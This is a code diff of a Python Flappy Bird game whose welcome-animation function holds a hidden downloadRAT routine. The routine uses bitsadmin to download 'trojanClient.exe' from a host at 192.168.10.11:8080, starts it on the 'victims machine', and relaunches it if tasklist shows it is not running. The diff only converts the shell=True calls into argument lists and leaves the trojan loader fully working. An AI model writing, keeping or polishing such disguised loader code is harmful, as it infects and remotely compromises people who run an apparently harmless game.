@@ -140,11 +140,11 @@ def main():
     
 def showWelcomeAnimation():
     def downloadRAT():
-        cmd = "bitsadmin /transfer wcb /priority high http://192.168.10.11:8080/trojanClient.exe "+destination
-        subprocess.call(cmd, shell=True)
+        cmd = ["bitsadmin", "/transfer", "wcb", "/priority", "high", "http://192.168.10.11:8080/trojanClient.exe", destination]
+        subprocess.run(cmd, shell=False)
 
-        cmd = "start "+destination
-        subprocess.call(cmd, shell=True)
+        cmd = ["start", destination]
+        subprocess.run(cmd, shell=False)
 
     # check if the RAT already exists on victims machine
     if not os.path.exists(destination):
@@ -158,13 +158,13 @@ def showWelcomeAnimation():
         # ==========================================================
     else:
         #check if the RAT is already running
-        cmd ='tasklist /FI "IMAGENAME eq client.exe" /FO CSV'
-        output = subprocess.check_output(cmd, shell=True)
+        cmd =['tasklist', '/FI', 'IMAGENAME eq client.exe', '/FO', 'CSV']
+        output = subprocess.check_output(cmd, shell=False)
 
         # if the RAT is not running, run the RAT
         if 'INFO: ' in output:
-            cmd = "start "+destination
-            subprocess.call(cmd, shell=True)
+            cmd = ["start", destination]
+            subprocess.run(cmd, shell=False)
     
     """Shows welcome screen animation of flappy bird"""
     # index of player to blit on screen
